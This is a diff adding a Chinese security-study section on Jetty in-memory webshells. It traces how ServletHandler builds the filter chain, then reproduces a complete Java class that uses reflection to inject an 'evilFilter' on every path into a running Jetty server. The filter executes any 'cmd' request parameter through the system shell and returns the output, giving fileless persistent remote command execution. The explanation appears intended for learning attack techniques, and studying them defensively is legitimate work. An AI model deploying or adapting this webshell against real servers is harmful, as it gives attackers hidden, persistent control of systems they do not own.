@@ -332,3 +332,289 @@ detectCustomCollations触发：
 其实这一块在实际中用不到，毕竟哪一个网站会让你 mysql连接都可控呢，只有ctf题才有可能
 ```
 
+## Jetty内存马
+
+### 环境搭建
+
+```java
+Jetty是一个开源的servlet容器，其实和tomcat很详细，但它可以迅速为一些独立运行的java应用提供网络和web连接。
+```
+
+```java
+<dependency>
+        <groupId>org.eclipse.jetty</groupId>
+        <artifactId>jetty-server</artifactId>
+        <version>9.4.30.v20200611</version>
+        <scope>provided</scope>
+    </dependency>
+```
+
+本地搭建的时候一直不对，搭了好几天了，先看原理了~~~
+
+### Filter分析
+
+寻找第一个出现和filters相关信息的调用栈，可以快速定位获取上下文的内容。
+
+![image-20231016190632327](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016190632327.png)
+
+找到第一次调用`doFilter`的地方，ServletHandler::doHandle中第一次调用了doFilter,chain.doFilter().
+
+考虑chain是如何生成的
+
+![image-20231016190844559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016190844559.png)
+
+`ServletHandler::doHandle`中定义了`chain（FilterChain）类型`，接着调用了`getFilterChain`，跟进查看`getFilterChain`，该函数构造FilterChain。
+
+![image-20231016191306880](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016191306880.png)
+
+```java
+下面是对filters进行了一个遍历（不对）
+    应该是对_filterpathMappings进行了一个遍历从中获取元素中的_Holder（FilterHolder类型），然后把值存进filters中，应该就是把路径存了进去
+```
+
+![image-20231016191405896](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016191405896.png)
+
+也就是获得的是filter自定义过滤器的名字
+
+![image-20231016192104926](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192104926.png)
+
+接着经过`new ServletHandler.CacheChain(filers,servletHolder)`，会将filters中的信息存入chain，然后返回chain。
+
+![image-20231016192331663](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192331663.png)
+
+继续往上跟进，观察`_filterPathMappings`如何生成的。观察调用栈可以发现，在第一次调用`ServletHandler`的时候，在实例化的`ServletHandler`对象中有`this._filterPathMappings`，那么可以理解为获取到`ServletHandler对象`就能获取到`_filterPathMappings`
+
+![image-20231016192531539](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192531539.png)
+
+所以如何将恶意filter注入的关键在于在`_filterPathMappings`中添加必要的元素。需要往filerPathMappings中添加FilterMapping类型的元素。根据经验，可以假设FilterMapping中需要包含如下三个变量。
+
+![image-20231016192705153](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192705153.png)
+
+![image-20231016192849489](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192849489.png)
+
+```java
+先写一下我的思路：其实可以发现递归啥的根源就是这个_filePathMappings，而_filePathMappings又是从ServletHandler中获得的，所以我们要先获取这个ServletHandler这个对象
+```
+
+`其他✌的思路`,基本相似
+
+```java
+1、获取ServletHandler
+2、获取_filterPathMappings
+3、往_filterPathMappings中添加元素FilterMapping的实例化对象
+其中该实例化对象包含三个变量：分别是_filterName,_holder,_pathSpecs
+```
+
+
+
+
+
+
+
+## `10.16晚终于把环境搞定了通过从网上拔了一个项目，改吧改吧`
+
+X:\jetty\code-servlet-parent(项目的路径)
+
+参考这个连接：[使用maven-Jetty9-plugin插件运行第一个Servlet - 极客子羽 - 博客园 (cnblogs.com)](https://www.cnblogs.com/kendoziyu/p/first-servlet-project-using-maven-Jetty9-plugin.html)
+
+又遇到一个问题，就是原代码没有下载下来，导致不能看源代码，直接pom.xml导致一个依赖
+
+ ```java
+ <dependency>
+             <groupId>org.eclipse.jetty</groupId>
+             <artifactId>jetty-server</artifactId>
+             <version>9.4.33.v20201020</version>
+             <scope>provided</scope>
+         </dependency>
+ ```
+
+#### 直接在右边调试运行
+
+![image-20231017155214571](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017155214571.png)
+
+然后先找一个能打通的文章细看
+
+![image-20231017192704373](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017192704373.png)
+
+文章非常nice我都能看懂，就不生产垃圾了http://wjlshare.com/archives/1707
+
+```java
+import javax.servlet.*;
+import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.util.Map;
+
+@SuppressWarnings("all")
+public class JettyFilterMemShell implements Filter {
+
+    Object request = null;
+    Object response = null;
+    boolean bool = false;
+    String filterName = "evilFilter";
+    String urlPattern = "/*";
+
+    static {
+        JettyFilterMemShell shell = new JettyFilterMemShell();
+        try {
+            shell.init();
+            Object _scope = JettyFilterMemShell.getField(shell.request,"_scope");
+            // 获取 ServletHandler 对象
+            Object _servletHandler = JettyFilterMemShell.getField(_scope,"_servletHandler");
+
+            Object[] _filters = (Object[]) JettyFilterMemShell.getField(_servletHandler,"_filters");
+            // 判断 filter 是否已注入，如果已注入就不继续运行代码
+            for (Object filter:_filters){
+                String _name = (String) JettyFilterMemShell.getField(filter,"_name");
+                if (_name.equals(shell.filterName)){
+                    shell.bool = true;
+                    break;
+                }
+            }
+
+            if (!shell.bool){
+                // 反射获取 FilterHolder 构造器并进行实例化
+                Class filterHolderClas = _filters[0].getClass(); 
+                Constructor filterHolderCons = filterHolderClas.getConstructor(javax.servlet.Filter.class);
+                Object filterHolder = filterHolderCons.newInstance(shell); 了
+
+                // 反射获取 FilterMapping 构造器并进行实例化
+                Object[] _filtersMappings = (Object[]) JettyFilterMemShell.getField(_servletHandler,"_filterMappings");
+                Class filterMappingClas = _filtersMappings[0].getClass(); 
+                Constructor filterMappingCons = filterMappingClas.getConstructor();
+                Object filterMapping = filterMappingCons.newInstance();
+
+                // 反射赋值 filter 名
+                Field _filterNameField = filterMappingClas.getDeclaredField("_filterName");
+                _filterNameField.setAccessible(true);
+                _filterNameField.set(filterMapping,shell.filterName);
+
+                // 反射赋值 _holder
+                Field _holderField = filterMappingClas.getDeclaredField("_holder");
+                _holderField.setAccessible(true);
+                _holderField.set(filterMapping,filterHolder);
+
+                // 反射赋值 urlpattern
+                Field _pathSpecsField = filterMappingClas.getDeclaredField("_pathSpecs");
+                _pathSpecsField.setAccessible(true);
+                _pathSpecsField.set(filterMapping,new String[]{shell.urlPattern});
+
+                /**
+                 * private final Map<String, FilterHolder> _filterNameMap = new HashMap();
+                 *
+                 *  at org.eclipse.jetty.servlet.ServletHandler.updateMappings(ServletHandler.java:1345)
+                 *  at org.eclipse.jetty.servlet.ServletHandler.setFilterMappings(ServletHandler.java:1542)
+                 *  at org.eclipse.jetty.servlet.ServletHandler.prependFilterMapping(ServletHandler.java:1242)
+                 */
+
+                // 属性带有 final 需要先反射修改 modifiers 才能编辑 final 变量
+                Field _filterNameMapField = _servletHandler.getClass().getDeclaredField("_filterNameMap");
+                _filterNameMapField.setAccessible(true);
+                Field modifiersField = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
+                modifiersField.setAccessible(true);
+                modifiersField.setInt(_filterNameMapField,_filterNameMapField.getModifiers()& ~Modifier.FINAL);
+                // 先把原来的取出来然后再放进去
+                Map _filterNameMap = (Map) _filterNameMapField.get(_servletHandler);
+                _filterNameMap.put(shell.filterName, filterHolder);
+                _filterNameMapField.set(_servletHandler,_filterNameMap);
+                                // 调用 prependFilterMapping 将 mapping 放到第一个
+                Method prependFilterMappingMethod = _servletHandler.getClass().getDeclaredMethod("prependFilterMapping",filterMappingClas);
+                prependFilterMappingMethod.setAccessible(true);
+                prependFilterMappingMethod.invoke(_servletHandler,filterMapping);
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public void init() throws Exception{
+        Class<?> clazz = Thread.currentThread().getClass();
+        Field field = clazz.getDeclaredField("threadLocals");
+        field.setAccessible(true);
+        Object object = field.get(Thread.currentThread());
+        field = object.getClass().getDeclaredField("table");
+        field.setAccessible(true);
+        object = field.get(object);
+        Object[] arrayOfObject = (Object[])object;
+        for (byte b = 0; b < arrayOfObject.length; b++) {
+            Object object1 = arrayOfObject[b];
+            if (object1 != null) {
+                field = object1.getClass().getDeclaredField("value");
+                field.setAccessible(true);
+                object = field.get(object1);
+                if (object != null && object.getClass().getName().endsWith("HttpConnection")) {
+                    Method method = object.getClass().getDeclaredMethod("getHttpChannel", null);
+                    Object object2 = method.invoke(object, null);
+                    method = object2.getClass().getMethod("getRequest", null);
+                    this.request =  method.invoke(object2, null);
+                    method = this.request.getClass().getMethod("getResponse", null);
+                    this.response =  method.invoke(this.request, null);
+                    break;
+                }
+            }
+        }
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+
+        String cmd = servletRequest.getParameter("cmd");
+        if(cmd != null && !cmd.isEmpty()){
+            String[] cmds = null;
+            if(File.separator.equals("/")){
+                cmds = new String[]{"/bin/sh", "-c", cmd};
+            }else{
+                cmds = new String[]{"cmd", "/C", cmd};
+            }
+
+            Process process = Runtime.getRuntime().exec(cmds);
+            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                stringBuilder.append(line + '\n');
+            }
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+            return;
+        }
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+    }
+
+    public static Object getField(Object obj, String fieldName) throws Exception {
+        Field f0 = null;
+        Class clas = obj.getClass();
+
+        while (clas != Object.class){
+            try {
+                f0 = clas.getDeclaredField(fieldName);
+                break;
+            } catch (NoSuchFieldException e){
+                clas = clas.getSuperclass();
+            }
+        }
+
+        if (f0 != null){
+            f0.setAccessible(true);
+            return f0.get(obj);
+        }else {
+            throw new NoSuchFieldException(fieldName);
+        }
+    }
+}
+```
+
+![image-20231017201951005](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017201951005.png)
